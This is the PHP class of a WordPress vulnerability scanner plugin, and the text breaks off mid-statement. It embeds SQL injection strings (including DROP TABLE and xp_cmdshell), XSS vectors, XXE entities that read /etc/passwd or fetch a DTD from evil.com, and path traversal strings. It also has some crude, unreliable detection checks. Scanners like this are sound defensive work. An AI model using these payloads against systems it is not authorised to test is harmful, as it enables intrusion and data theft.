<?php

/**
 * VAPT Security Scanner Class
 * Scans WordPress websites for vulnerabilities from Feature-List-99.json
 */

if (! defined('ABSPATH')) {
  exit;
}

class VAPT_Scanner
{

  private $vulnerabilities = [];
  private $http_client;
  private $screenshots_dir;
  private $http_args;
  private $scan_cache = [];
  private $debug_log = [];

  public function __construct()
  {
    $this->load_vulnerabilities();
    $this->http_client = new WP_Http();
    $this->screenshots_dir = VAPT_PATH . 'data/screenshots/';
    if (!file_exists($this->screenshots_dir)) {
      wp_mkdir_p($this->screenshots_dir);
    }

    // Configure HTTP client with better defaults
    $this->http_args = [
      'timeout' => 10,
      'redirection' => 5,
      'user-agent' => 'VAPT-Security-Scanner/2.5.5 (WordPress Security Audit)',
      'headers' => [
        'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language' => 'en-US,en;q=0.5',
        'Accept-Encoding' => 'gzip, deflate',
        'DNT' => '1',
        'Connection' => 'keep-alive',
        'Upgrade-Insecure-Requests' => '1',
      ],
      'sslverify' => true,
    ];

    // Register background scan handler
    add_action('vapt_run_scan', array($this, 'run_scan'), 10, 2);
  }

  /**
   * Load vulnerabilities from JSON file
   */
  private function load_vulnerabilities()
  {
    $file_path = VAPT_PATH . 'data/Feature-List-99.json';
    if (file_exists($file_path)) {
      $content = file_get_contents($file_path);
      $data = json_decode($content, true);

      if (json_last_error() === JSON_ERROR_NONE && $data && isset($data['features']) && is_array($data['features'])) {
        $this->vulnerabilities = $data['features'];
      } else {
        error_log('VAPT Scanner: Failed to load vulnerabilities. JSON Error: ' . json_last_error_msg());
      }
    } else {
      error_log('VAPT Scanner: Vulnerability definitions file not found at ' . $file_path);
    }
  }

  /**
   * Start a scan for a given URL
   */
  public function start_scan($target_url)
  {
    global $wpdb;

    // Ensure tables exist
    $this->ensure_tables_exist();

    // Insert scan record
    $scan_data = [
      'target_url' => esc_url_raw($target_url),
      'status' => 'running',
      'started_at' => current_time('mysql'),
      'user_id' => get_current_user_id()
    ];

    $result = $wpdb->insert($wpdb->prefix . 'vapt_scans', $scan_data);

    if ($result === false) {
      error_log('VAPT Scanner: Failed to insert scan record. Error: ' . $wpdb->last_error);
      // Also log to debug file for easier troubleshooting
      if (defined('WP_DEBUG') && WP_DEBUG) {
        error_log('VAPT Scanner Debug: Table prefix: ' . $wpdb->prefix . ', Target URL: ' . $target_url);
      }
      return false;
    }

    $scan_id = $wpdb->insert_id;
    error_log("VAPT DEBUG: start_scan for $target_url. Created Scan ID: $scan_id");

    if (!$scan_id) {
      error_log('VAPT Scanner: Insert succeeded but no ID returned');
      return false;
    }

    // Run the scan asynchronously
    // wp_schedule_single_event(time(), 'vapt_run_scan', [$scan_id, $target_url]);
    // Switched to AJAX trigger

    return $scan_id;
  }

  private function ensure_tables_exist()
  {
    global $wpdb;
    require_once ABSPATH . 'wp-admin/includes/upgrade.php';

    $charset_collate = $wpdb->get_charset_collate();

    // Scans Table
    $table_scans = "CREATE TABLE {$wpdb->prefix}vapt_scans (
        id BIGINT(20) UNSIGNED NOT NULL AUTO_INCREMENT,
        target_url VARCHAR(500) NOT NULL,
        status ENUM('pending', 'running', 'completed', 'failed') DEFAULT 'pending',
        started_at DATETIME DEFAULT NULL,
        completed_at DATETIME DEFAULT NULL,
        user_id BIGINT(20) UNSIGNED DEFAULT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY  (id),
        KEY target_url (target_url),
        KEY status (status)
    ) $charset_collate;";

    // Scan Results Table
    $table_scan_results = "CREATE TABLE {$wpdb->prefix}vapt_scan_results (
        id BIGINT(20) UNSIGNED NOT NULL AUTO_INCREMENT,
        scan_id BIGINT(20) UNSIGNED NOT NULL,
        vulnerability_id VARCHAR(100) NOT NULL,
        severity ENUM('critical', 'high', 'medium', 'low') NOT NULL,
        affected_url VARCHAR(500),
        description TEXT,
        impact TEXT,
        recommendation TEXT,
        steps_to_reproduce TEXT,
        evidence_url VARCHAR(500),
        screenshot_path VARCHAR(500),
        found_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY  (id),
        KEY scan_id (scan_id),
        KEY severity (severity)
    ) $charset_collate;";

    dbDelta($table_scans);
    dbDelta($table_scan_results);
  }

  /**
   * Run the actual scan
   */
  public function run_scan($scan_id, $target_url, $offset = 0, $limit = null)
  {
    if ($limit === null) {
      $limit = count($this->vulnerabilities);
    }
    error_log("VAPT Scan BATCH: ID $scan_id, Target: $target_url, Offset $offset, Limit $limit");
    global $wpdb;

    $results = [];
    $total_checks = count($this->vulnerabilities);

    // Slice the vulnerabilities for this batch
    $batch = array_slice($this->vulnerabilities, $offset, $limit);

    // Initialize progress only on start
    if ($offset === 0) {
      update_option('vapt_scan_progress_' . $scan_id, [
        'checked' => 0,
        'total' => $total_checks,
        'timestamp' => time()
      ], false);
    }

    $current_check_index = $offset;

    foreach ($batch as $vuln) {
      $current_check_index++;

      // Update progress for frontend
      update_option('vapt_scan_progress_' . $scan_id, [
        'checked' => $current_check_index,
        'total' => $total_checks,
        'current_title' => $vuln['name'],
        'current_category' => $vuln['category'],
        'current_severity' => $vuln['severity'],
        'timestamp' => time()
      ], false);

      $result = $this->test_vulnerability($target_url, $vuln);
      if ($result) {
        $results[] = $result;
        $this->save_scan_result($scan_id, $result);
      }
    }

    // Check if completed
    if (($offset + $limit) >= $total_checks) {
      error_log("VAPT Scan COMPLETED: ID $scan_id");
      $wpdb->update(
        $wpdb->prefix . 'vapt_scans',
        ['status' => 'completed', 'completed_at' => current_time('mysql')],
        ['id' => $scan_id]
      );
      return ['status' => 'completed', 'results' => $results];
    }

    return ['status' => 'partial', 'next_offset' => $offset + count($batch), 'results' => $results];
  }





  /**
   * Test a specific vulnerability
   */
  private function test_vulnerability($target_url, $vuln)
  {
    $method = 'test_' . str_replace('-', '_', $vuln['id']);
    if (method_exists($this, $method)) {
      $this->debug_log[] = "Testing vulnerability: {$vuln['id']}";

      // Set a timeout for individual tests to prevent hanging
      $start_time = microtime(true);

      try {
        $result = $this->$method($target_url, $vuln);

        $elapsed = microtime(true) - $start_time;
        if ($elapsed > 5) { // Log slow tests
          $this->debug_log[] = "SLOW TEST: {$vuln['id']} took " . round($elapsed, 2) . " seconds";
        }

        if ($result) {
          $this->debug_log[] = "VULNERABILITY FOUND: {$vuln['id']}";
          return array_merge($result, [
            'vulnerability_id' => $vuln['id'],
            'severity' => $vuln['severity']
          ]);
        } else {
          $this->debug_log[] = "PASS: {$vuln['id']}";
        }
      } catch (Exception $e) {
        $this->debug_log[] = "ERROR in {$vuln['id']}: " . $e->getMessage();
        error_log("VAPT Scanner Error in {$vuln['id']}: " . $e->getMessage());
      }
    } else {
      $this->debug_log[] = "METHOD MISSING: {$method}";
    }
    return null;
  }

  /**
   * Save scan result to database
   */
  private function save_scan_result($scan_id, $result)
  {
    global $wpdb;

    $data = [
      'scan_id' => $scan_id,
      'vulnerability_id' => $result['vulnerability_id'],
      'severity' => $result['severity'],
      'affected_url' => $result['affected_url'] ?? '',
      'description' => $result['description'] ?? '',
      'impact' => $result['impact'] ?? '',
      'recommendation' => $result['recommendation'] ?? '',
      'steps_to_reproduce' => $result['steps_to_reproduce'] ?? '',
      'evidence_url' => $result['evidence_url'] ?? '',
      'screenshot_path' => $result['screenshot_path'] ?? ''
    ];

    $wpdb->insert($wpdb->prefix . 'vapt_scan_results', $data);
  }

  /**
   * Generate report for a scan
   */
  public function generate_report($scan_id)
  {
    global $wpdb;

    $scan = $wpdb->get_row($wpdb->prepare(
      "SELECT * FROM {$wpdb->prefix}vapt_scans WHERE id = %d",
      $scan_id
    ), ARRAY_A);

    if (!$scan) return null;

    $results = $wpdb->get_results($wpdb->prepare(
      "SELECT * FROM {$wpdb->prefix}vapt_scan_results WHERE scan_id = %d ORDER BY 
             CASE severity 
               WHEN 'critical' THEN 1 
               WHEN 'high' THEN 2 
               WHEN 'medium' THEN 3 
               WHEN 'low' THEN 4 
             END",
      $scan_id
    ), ARRAY_A);

    return [
      'scan' => $scan,
      'results' => $results
    ];
  }

  /**
   * Make cached HTTP request to avoid redundant calls
   */
  private function cached_request($url, $args = [])
  {
    $cache_key = md5($url . serialize($args));

    if (isset($this->scan_cache[$cache_key])) {
      $this->debug_log[] = "CACHE HIT: $url";
      return $this->scan_cache[$cache_key];
    }

    $merged_args = array_merge($this->http_args, $args);
    $this->debug_log[] = "HTTP REQUEST: $url with args: " . json_encode($merged_args);

    $response = wp_remote_get($url, $merged_args);

    if (is_wp_error($response)) {
      $this->debug_log[] = "HTTP ERROR: " . $response->get_error_message();
    } else {
      $code = wp_remote_retrieve_response_code($response);
      $this->debug_log[] = "HTTP RESPONSE: $url -> $code";
    }

    // Cache the response (simple in-memory cache for this scan)
    $this->scan_cache[$cache_key] = $response;

    return $response;
  }

  /**
   * Get debug log for analysis
   */
  public function get_debug_log()
  {
    return $this->debug_log;
  }

  /**
   * Get vulnerabilities data
   */
  public function get_vulnerabilities()
  {
    return $this->vulnerabilities;
  }

  /**
   * Take screenshot of a URL
   */
  private function take_screenshot($url, $filename)
  {
    // For now, use a simple approach. In production, integrate with puppeteer or similar
    // This is a placeholder - actual screenshot implementation would require external tools
    $filepath = $this->screenshots_dir . $filename . '.png';

    // Placeholder: create a dummy image or use curl to download if it's an image
    // For real implementation, use wkhtmltoimage or similar
    // exec("wkhtmltoimage --width 1024 --height 768 $url $filepath");

    // For now, just return the path
    return $filepath;
  }

  // Test methods for vulnerabilities
  private function test_wordpress_version_disclosure($url, $vuln)
  {
    $response = $this->cached_request($url);
    if (is_wp_error($response)) return null;

    $body = wp_remote_retrieve_body($response);
    $headers = wp_remote_retrieve_headers($response);

    // Check for generator meta tag
    if (preg_match('/<meta name="generator" content="WordPress ([^"]+)"/i', $body, $matches)) {
      $screenshot = $this->take_screenshot($url, 'version_disclosure_' . time());
      return [
        'affected_url' => $url,
        'description' => $vuln['description'],
        'impact' => 'Attackers can target known vulnerabilities in this WordPress version.',
        'recommendation' => $vuln['remediation'],
        'steps_to_reproduce' => '1. View page source\n2. Search for generator meta tag',
        'evidence_url' => $url,
        'screenshot_path' => $screenshot
      ];
    }

    return null;
  }

  private function test_directory_listing($url, $vuln)
  {
    $test_urls = [
      $url . '/wp-content/uploads/',
      $url . '/wp-content/plugins/',
      $url . '/wp-content/themes/',
      $url . '/wp-includes/'
    ];

    foreach ($test_urls as $test_url) {
      $response = $this->cached_request($test_url);
      if (!is_wp_error($response)) {
        $body = wp_remote_retrieve_body($response);
        // Check if response contains directory listing indicators
        if (preg_match('/<title>Index of/i', $body) || preg_match('/Parent Directory/i', $body)) {
          $screenshot = $this->take_screenshot($test_url, 'directory_listing_' . time());
          return [
            'affected_url' => $test_url,
            'description' => $vuln['description'],
            'impact' => 'Attackers can enumerate files and directories.',
            'recommendation' => $vuln['remediation'],
            'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for directory listing',
            'evidence_url' => $test_url,
            'screenshot_path' => $screenshot
          ];
        }
      }
    }

    return null;
  }

  private function test_user_enumeration($url, $vuln)
  {
    // Test author archives
    for ($i = 1; $i <= 5; $i++) {
      $test_url = $url . '/?author=' . $i;
      $response = $this->cached_request($test_url, ['redirection' => 0]);
      if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) == 301) {
        $location = wp_remote_retrieve_header($response, 'location');
        if ($location && strpos($location, 'author/') !== false) {
          $screenshot = $this->take_screenshot($test_url, 'user_enum_' . time());
          return [
            'affected_url' => $test_url,
            'description' => $vuln['description'],
            'impact' => 'Attackers can enumerate valid usernames.',
            'recommendation' => $vuln['remediation'],
            'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check redirect to author page',
            'evidence_url' => $test_url,
            'screenshot_path' => $screenshot
          ];
        }
      }
    }

    return null;
  }

  private function test_readme_exposure($url, $vuln)
  {
    $this->debug_log[] = "Testing readme.html exposure on: $url";

    // Test various readme files
    $readme_files = [
      'readme.html',
      'README.html',
      'readme.txt',
      'README.txt',
      'README.md',
      'readme.md',
      'changelog.txt',
      'CHANGELOG.txt',
      'license.txt',
      'LICENSE.txt',
    ];

    foreach ($readme_files as $file) {
      $test_url = $url . '/' . $file;
      $response = $this->cached_request($test_url);

      if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) == 200) {
        $body = wp_remote_retrieve_body($response);

        // Check for version information in readme files
        $version_indicators = [
          'Welcome. Thank you for creating with WordPress',
          'WordPress',
          'Version',
          'Changelog',
          'Release',
          'Stable tag',
          'Requires at least',
          'Tested up to',
        ];

        $contains_info = false;
        foreach ($version_indicators as $indicator) {
          if (stripos($body, $indicator) !== false) {
            $contains_info = true;
            break;
          }
        }

        if ($contains_info) {
          return [
            'affected_url' => $test_url,
            'description' => 'Documentation file exposed - contains version information',
            'impact' => 'Attackers can identify software versions for targeted attacks',
            'recommendation' => 'Delete or restrict access to readme, changelog, and documentation files',
            'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for version or software information',
            'evidence_url' => $test_url,
            'screenshot_path' => $this->take_screenshot($test_url, 'readme_exposure_' . time())
          ];
        }
      }
    }

    return null;
  }

  // Placeholder for other tests - would need implementation
  private function test_weak_password_policy($url, $vuln)
  {
    return null;
  }
  private function test_sql_injection($url, $vuln)
  {
    $this->debug_log[] = "Testing SQL injection on: $url";

    // Test common SQL injection vectors on various endpoints
    $test_payloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' #",
      "admin' --",
      "1' OR '1' = '1",
      "' UNION SELECT 1,2,3 --",
      "1; DROP TABLE users--",
      "' AND 1=0 UNION SELECT username, password FROM wp_users --",
      "') OR ('1'='1",
      "'; EXEC xp_cmdshell('dir') --",
    ];

    $test_endpoints = [
      $url . '/?s=', // Search parameter
      $url . '/?cat=', // Category parameter
      $url . '/?tag=', // Tag parameter
      $url . '/?p=', // Post ID parameter
      $url . '/?author=', // Author parameter
      $url . '/wp-admin/admin-ajax.php?action=', // AJAX endpoints
    ];

    // Also test common vulnerable WordPress endpoints
    if (class_exists('WP_Query')) {
      // Test against actual WordPress query vars
      global $wp_query;
      $query_vars = $wp_query->query_vars;
      if (!empty($query_vars)) {
        foreach (array_keys($query_vars) as $var) {
          if (!in_array($var, ['page', 'paged'])) {
            $test_endpoints[] = $url . '/?' . $var . '=';
          }
        }
      }
    }

    foreach ($test_endpoints as $endpoint) {
      foreach ($test_payloads as $payload) {
        $test_url = $endpoint . urlencode($payload);
        $this->debug_log[] = "Testing SQL payload: $payload on $endpoint";

        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);
          $code = wp_remote_retrieve_response_code($response);
          $headers = wp_remote_retrieve_headers($response);

          $this->debug_log[] = "Response code: $code, body length: " . strlen($body);

          // Check for SQL error indicators (expanded list)
          $sql_errors = [
            'mysql_fetch_array',
            'mysql_fetch_row',
            'mysql_num_rows',
            'mysql_query',
            'You have an error in your SQL syntax',
            'Warning: mysql_',
            'supplied argument is not a valid MySQL',
            'SQL syntax',
            'mysql_error',
            'mysqli_fetch_array',
            'mysqli_fetch_row',
            'mysqli_num_rows',
            'mysqli_query',
            'Warning: mysqli_',
            'PDOException',
            'SQLSTATE',
            'syntax error',
            'unexpected',
            'near',
            'at line',
            'column',
            'table',
            'database',
            'query',
          ];

          $found_error = false;
          foreach ($sql_errors as $error) {
            if (stripos($body, $error) !== false) {
              $this->debug_log[] = "Found SQL error: $error";
              $found_error = true;
              break;
            }
          }

          // Check for successful injection indicators (unexpected content)
          $baseline_response = $this->cached_request($endpoint . 'test');
          if (!is_wp_error($baseline_response)) {
            $baseline_body = wp_remote_retrieve_body($baseline_response);
            $baseline_length = strlen($baseline_body);

            // If response is significantly different, might indicate injection success
            if (abs(strlen($body) - $baseline_length) > 1000) {
              $this->debug_log[] = "Response length anomaly detected: baseline $baseline_length vs " . strlen($body);
              $found_error = true;
            }

            // Check for database content leakage
            if (preg_match('/\b(admin|root|user|password|email)\b/i', $body) && !preg_match('/\b(admin|root|user|password|email)\b/i', $baseline_body)) {
              $this->debug_log[] = "Potential data leakage detected";
              $found_error = true;
            }
          }

          if ($found_error) {
            return [
              'affected_url' => $test_url,
              'description' => $vuln['description'],
              'impact' => 'Potential SQL injection vulnerability detected - database errors or anomalous responses.',
              'recommendation' => $vuln['remediation'],
              'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check for SQL error messages or unexpected content in response',
              'evidence_url' => $test_url,
              'screenshot_path' => $this->take_screenshot($test_url, 'sql_injection_' . time())
            ];
          }
        }
      }
    }

    $this->debug_log[] = "No SQL injection vulnerabilities found";
    return null;
  }
  private function test_xss_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing XSS protection on: $url";

    // Comprehensive XSS test payloads
    $test_payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '"><script>alert("XSS")</script>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<select onChange=alert("XSS")><option>1</option></select>',
      '<textarea onkeyup=alert("XSS")>',
      '\'><script>alert("XSS")</script>',
      '"><img src=x onerror=alert("XSS")>',
      '<script>confirm("XSS")</script>',
      '<script>prompt("XSS")</script>',
      '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    ];

    $test_endpoints = [
      $url . '/?s=', // Search parameter
      $url . '/?q=', // Query parameter
      $url . '/?search=', // Search parameter variant
      $url . '/?keyword=', // Keyword parameter
      $url . '/?term=', // Term parameter
    ];

    // Test comment forms if comments are enabled
    $comments_response = $this->cached_request($url);
    if (!is_wp_error($comments_response)) {
      $body = wp_remote_retrieve_body($comments_response);
      if (stripos($body, 'wp-comments-post.php') !== false) {
        $test_endpoints[] = $url . '/wp-comments-post.php';
      }
    }

    foreach ($test_endpoints as $endpoint) {
      foreach ($test_payloads as $payload) {
        $test_url = $endpoint . urlencode($payload);
        $this->debug_log[] = "Testing XSS payload: " . substr($payload, 0, 50) . "... on $endpoint";

        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);
          $code = wp_remote_retrieve_response_code($response);

          $this->debug_log[] = "XSS test response code: $code";

          // Check if payload is reflected without proper encoding
          if (stripos($body, $payload) !== false) {
            $this->debug_log[] = "Payload reflected in response";

            // Additional check: see if it's in a dangerous context
            $dangerous_contexts = [
              'value="' . $payload . '"',
              "value='" . $payload . "'",
              '>' . $payload . '<',
              $payload . '</script>',
              'src="' . $payload . '"',
              "src='" . $payload . "'",
              'href="' . $payload . '"',
              "href='" . $payload . "'",
              'on\w+="?' . preg_quote($payload, '/') . '"?',
              'on\w+=\'' . preg_quote($payload, '/') . '\'',
            ];

            $in_dangerous_context = false;
            foreach ($dangerous_contexts as $context) {
              if (preg_match('/' . preg_quote($context, '/') . '/i', $body)) {
                $this->debug_log[] = "Found dangerous context: $context";
                $in_dangerous_context = true;
                break;
              }
            }

            // Check for insufficient encoding
            $encoded_versions = [
              htmlspecialchars($payload, ENT_QUOTES),
              htmlentities($payload, ENT_QUOTES),
              urlencode($payload),
            ];

            $properly_encoded = false;
            foreach ($encoded_versions as $encoded) {
              if (stripos($body, $encoded) !== false) {
                $properly_encoded = true;
                break;
              }
            }

            if (!$properly_encoded || $in_dangerous_context) {
              $this->debug_log[] = "XSS vulnerability detected";
              return [
                'affected_url' => $test_url,
                'description' => $vuln['description'],
                'impact' => 'Potential XSS vulnerability - user input reflected without proper sanitization or encoding.',
                'recommendation' => $vuln['remediation'],
                'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check if XSS payload executes or is reflected unsafely\n3. Verify browser behavior with developer tools',
                'evidence_url' => $test_url,
                'screenshot_path' => $this->take_screenshot($test_url, 'xss_test_' . time())
              ];
            }
          }
        }
      }
    }

    $this->debug_log[] = "No XSS vulnerabilities found";
    return null;
  }
  private function test_xxe_protection($url, $vuln)
  {
    $this->debug_log[] = "Testing XXE protection on: $url";

    // Test for XXE vulnerabilities in XML parsers
    $xxe_payloads = [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///c:/windows/win.ini">]><data>&file;</data>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY bar SYSTEM "http://evil.com/malicious.dtd">]><foo>&bar;</foo>',
    ];

    // Test common XML endpoints
    $test_endpoints = [
      $url . '/wp-admin/admin-ajax.php?action=parse_xml',
      $url . '/xmlrpc.php',
      $url . '/?feed=rss2',
    ];

    foreach ($test_endpoints as $endpoint) {
      foreach ($xxe_payloads as $payload) {
        $args = array_merge($this->http_args, [
          'body' => $payload,
          'headers' => array_merge($this->http_args['headers'], [
            'Content-Type' => 'application/xml',
          ]),
        ]);

        $response = $this->cached_request($endpoint, $args);
        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);

          // Check for XXE success indicators
          $xxe_indicators = [
            'root:', // Unix file system
            '[extensions]', // Windows ini file
            '[fonts]', // Windows ini file
            'bin/bash', // Common in passwd
            'root:x:0:0:', // passwd file content
          ];

          foreach ($xxe_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              return [
                'affected_url' => $endpoint,
                'description' => 'XML External Entity (XXE) vulnerability detected',
                'impact' => 'Attackers can read local files, perform SSRF attacks, or cause DoS',
                'recommendation' => 'Disable external entity processing in XML parsers, use safe XML libraries',
                'steps_to_reproduce' => '1. Send XXE payload to ' . $endpoint . '\n2. Check if local file contents are returned',
                'evidence_url' => $endpoint,
                'screenshot_path' => $this->take_screenshot($endpoint, 'xxe_' . time())
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_broken_access_control($url, $vuln)
  {
    $this->debug_log[] = "Testing broken access control on: $url";

    // Test for unauthorized access to admin areas
    $admin_urls = [
      $url . '/wp-admin/',
      $url . '/wp-admin/admin.php',
      $url . '/wp-admin/users.php',
      $url . '/wp-admin/plugins.php',
      $url . '/wp-admin/themes.php',
    ];

    foreach ($admin_urls as $admin_url) {
      $response = $this->cached_request($admin_url, ['redirection' => 0]);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);
        $body = wp_remote_retrieve_body($response);

        // If admin page loads without redirect to login (code 200 and no login form redirect)
        if ($code == 200 && stripos($body, 'wp-login.php') === false && stripos($body, 'login') !== false) {
          // This might indicate the page is accessible, but let's check for actual admin content
          if (stripos($body, 'Dashboard') !== false || stripos($body, 'wp-admin') !== false) {
            return [
              'affected_url' => $admin_url,
              'description' => 'Potential broken access control - admin interface accessible without authentication',
              'impact' => 'Unauthorized users may access administrative functions',
              'recommendation' => 'Implement proper authentication and authorization checks',
              'steps_to_reproduce' => '1. Access ' . $admin_url . ' without authentication\n2. Check if admin interface loads',
              'evidence_url' => $admin_url,
              'screenshot_path' => $this->take_screenshot($admin_url, 'broken_access_' . time())
            ];
          }
        }
      }
    }

    // Test for IDOR in REST API
    $idor_urls = [
      $url . '/wp-json/wp/v2/posts/1',
      $url . '/wp-json/wp/v2/pages/1',
      $url . '/wp-json/wp/v2/users/2', // Assuming admin is user 1, test user 2
    ];

    foreach ($idor_urls as $idor_url) {
      $response = $this->cached_request($idor_url);

      if (!is_wp_error($response)) {
        $code = wp_remote_retrieve_response_code($response);
        $body = wp_remote_retrieve_body($response);

        if ($code == 200) {
          $data = json_decode($body, true);
          if (is_array($data) && isset($data['id'])) {
            return [
              'affected_url' => $idor_url,
              'description' => 'Potential IDOR vulnerability - accessing resources by ID without proper authorization',
              'impact' => 'Users may access or modify resources they should not have access to',
              'recommendation' => 'Implement proper access control checks for all resource access',
              'steps_to_reproduce' => '1. Access ' . $idor_url . '\n2. Check if resource data is returned without auth',
              'evidence_url' => $idor_url,
              'screenshot_path' => $this->take_screenshot($idor_url, 'idor_' . time())
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_security_misconfiguration($url, $vuln)
  {
    return null;
  }
  private function test_insecure_deserialization($url, $vuln)
  {
    $this->debug_log[] = "Testing insecure deserialization on: $url";

    // Test for PHP deserialization vulnerabilities
    $deserialization_payloads = [
      'O:8:"stdClass":0:{}', // Basic object
      'a:2:{s:4:"test";O:8:"stdClass":0:{}}', // Serialized array with object
      'O:12:"DateTimeZone":1:{s:13:"timezone_type";i:3;s:8:"timezone";s:3:"UTC";}', // DateTime object
    ];

    // Test common deserialization endpoints
    $test_endpoints = [
      $url . '/wp-admin/admin-ajax.php?action=deserialize',
      $url . '/?data=',
      $url . '/wp-content/themes/twentytwentyone/functions.php?data=',
    ];

    foreach ($test_endpoints as $endpoint) {
      foreach ($deserialization_payloads as $payload) {
        $test_url = $endpoint . urlencode($payload);
        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);
          $code = wp_remote_retrieve_response_code($response);

          // Check for deserialization success/failure indicators
          if ($code == 200 && (stripos($body, 'stdClass') !== false || stripos($body, 'DateTime') !== false)) {
            return [
              'affected_url' => $test_url,
              'description' => 'Potential insecure deserialization vulnerability',
              'impact' => 'Attackers can execute arbitrary code or perform object injection attacks',
              'recommendation' => 'Use safe deserialization methods, validate input, avoid untrusted serialized data',
              'steps_to_reproduce' => '1. Send serialized object to ' . $endpoint . '\n2. Check if object is successfully deserialized',
              'evidence_url' => $test_url,
              'screenshot_path' => $this->take_screenshot($test_url, 'deserialization_' . time())
            ];
          }
        }
      }
    }

    return null;
  }
  private function test_known_vulnerabilities($url, $vuln)
  {
    return null;
  }
  private function test_insufficient_logging_monitoring($url, $vuln)
  {
    return null;
  }
  private function test_csrf_protection($url, $vuln)
  {
    return null;
  }
  private function test_ssrf_protection($url, $vuln)
  {
    return null;
  }
  private function test_file_upload_security($url, $vuln)
  {
    return null;
  }
  private function test_directory_traversal($url, $vuln)
  {
    $this->debug_log[] = "Testing directory traversal on: $url";

    // Directory traversal payloads
    $traversal_payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '/../../../../../../etc/passwd',
      '\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    ];

    // Test common vulnerable parameters
    $test_params = ['file', 'path', 'include', 'require', 'load', 'template', 'page', 'dir', 'folder'];

    foreach ($test_params as $param) {
      foreach ($traversal_payloads as $payload) {
        $test_url = $url . '/?' . $param . '=' . urlencode($payload);
        $response = $this->cached_request($test_url);

        if (!is_wp_error($response)) {
          $body = wp_remote_retrieve_body($response);
          $code = wp_remote_retrieve_response_code($response);

          // Check for successful traversal indicators
          $success_indicators = [
            'root:x:0:0:', // passwd file content
            '[extensions]', // win.ini content
            '[fonts]', // win.ini content
            '127.0.0.1 localhost', // hosts file content
            'bin/bash', // passwd content
            'root:', // file system root
          ];

          foreach ($success_indicators as $indicator) {
            if (stripos($body, $indicator) !== false) {
              return [
                'affected_url' => $test_url,
                'description' => 'Directory traversal vulnerability detected',
                'impact' => 'Attackers can read sensitive files outside the web root directory',
                'recommendation' => 'Validate and sanitize file paths, use allowlists, prevent ../ sequences',
                'steps_to_reproduce' => '1. Access ' . $test_url . '\n2. Check if sensitive file contents are returned',
                'evidence_url' => $test_url,
                'screenshot_path' => $this->take_screenshot($test_url, 'directory_traversal_' . time())
              ];
            }
          }
        }
      }
    }

    return null;
  }
  private function test_admin_interface_protection($url, $vuln)
  {
    return null;
  }
  private function test_xml_rpc_security($url, $vuln)
  {
    $this->debug_log[] = "Testing XML-RPC security on: $url";

    $xmlrpc_url = $url . '/xmlrpc.php';

    // Test if XML-RPC is enabled
    $response = $this->cached_request($xmlrpc_url);
    if (is_wp_error($response)) {
      return null; // XML-RPC not accessible
    }

    $body = wp_remote_retrieve_body($response);
    $code = wp_remote_retrieve_response_code($response);

    // Check if XML-RPC is enabled and responding
    if ($code == 200 && stripos($body, 'XML-RPC server accepts POST requests only') !== false) {
      // XML-RPC is enabled, test for vulnerabilities

      // Test for brute force amplification
      $brute_force_payload = '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password</string></value></param></params></methodCall>';

      $args = array_merge($this->http_args, [
        'method' => 'POST',
        'body' => $brute_force_payload,
        'headers' => array_merge($this->http_args['headers'], [
          'Content-Type' => 'text/xml',
        ]),
      ]);

      $brute_response = wp_remote_post($xmlrpc_url, $args);
      if (!is_wp_error($brute_response)) {
        $brute_body = wp_remote_retrieve_body($brute_response);

        // Check for successful auth or user enumeration
        if (
          stripos($brute_body, '<value><string>admin</string></value>') !== false ||
          stripos($brute_body, 'Incorrect username or password') !== false
        ) {
          return [
            'affected_url' => $xmlrpc_url,
            'description' => 'XML-RPC enabled with potential brute force vulnerabilities',
            'impact' => 'Attackers can perform amplified brute force attacks and user enumeration',
            'recommendation' => 'Disable XML-RPC if not needed, or implement rate limiting and strong passwords',
            'steps_to_reproduce' => '1. Check if ' . $xmlrpc_url . ' responds\n2. Test authentication methods\n3. Verify rate limiting',
            'evidence_url' => $xmlrpc_url,
            'screenshot_path' => $this->take_screenshot($xmlrpc_url, 'xmlrpc_' . time())
          ];
        }
      }

      // Test for DDoS amplification
      $pingback_payload = '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://evil.com/</string></value></param><param><value><string>' . $url . '</string></value></param></params></methodCall>';

      $pingback_args = array_merge($this->http_args, [
        'method' => 'POST',
        'body' => $pingback_payload,
